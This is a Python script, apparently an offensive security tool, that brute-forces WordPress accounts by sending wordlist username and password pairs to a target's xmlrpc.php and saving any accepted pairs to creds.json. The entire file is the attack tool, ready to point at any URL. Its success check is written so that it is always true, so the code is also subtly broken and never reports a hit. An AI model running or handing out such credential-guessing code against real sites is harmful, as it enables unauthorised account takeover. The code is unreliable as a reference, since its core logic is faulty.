#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : bruteforce_login.py
# Author             : Podalirius (@podalirius_)
# Date created       : 10 Oct 2021

import argparse
import requests
import json
from urllib.parse import urljoin

def readlist(file):
    f = open(file, 'r')
    data = [line.strip() for line in f.readlines()]
    f.close()
    return list(set(data))


def trylogin(url, methodName, username, password):
    session = requests.Session()
    # Get cookies
    r = session.get(url)
    # Try auth
    r = session.post(
        urljoin(url, "xmlrpc.php"),
        data=f"""
        <methodCall>
        <methodName>{methodName}</methodName>
        <params>
        <param><value>{username}</value></param>
        <param><value>{password}</value></param>
        </params>
        </methodCall>
        """
    )

    if b'Incorrect username or password' or b'Identifiant ou mot de passe incorrect' in r.content:
        return False
    else:
        return True


def parseArgs():
    parser = argparse.ArgumentParser(description="Description message")
    parser.add_argument("-u", "--users", default=None, required=True, help='Usernames wordlist')
    parser.add_argument("-p", "--passwords", default=None, required=True, help='Passwords wordlist')
    parser.add_argument("-t", "--target", default=None, required=True, help='Specify the target url')
    parser.add_argument("-m", "--method-name", dest="methodName", default="wp.getUsersBlogs", required=False, help='Specify methodName (default is wp.getUsersBlogs)')
    parser.add_argument("-v", "--verbose", default=False, action="store_true", help='')
    return parser.parse_args()


if __name__ == '__main__':
    options = parseArgs()

    wordlist_usernames = readlist(options.users)
    wordlist_passwords = readlist(options.passwords)
    target = options.target
    methodName = options.methodName

    # Generate combinations
    comb = []
    for password in wordlist_passwords:
        for username in wordlist_usernames:
            comb.append((username, password))

    # Waits for all the threads to be completed
    for _c in comb:
        u, p = _c[0], _c[1]
        if trylogin(target, methodName, u, p):
            print("[+] Valid login found (%s, %s)" % (u, p))
            f = open("creds.json", "a")
            f.write(json.dumps({"username": u, "password": p}) + "\n")
            f.close()
        else:
            if options.verbose == True:
                print("[!] Incorrect login for (%s, %s)" % (u, p))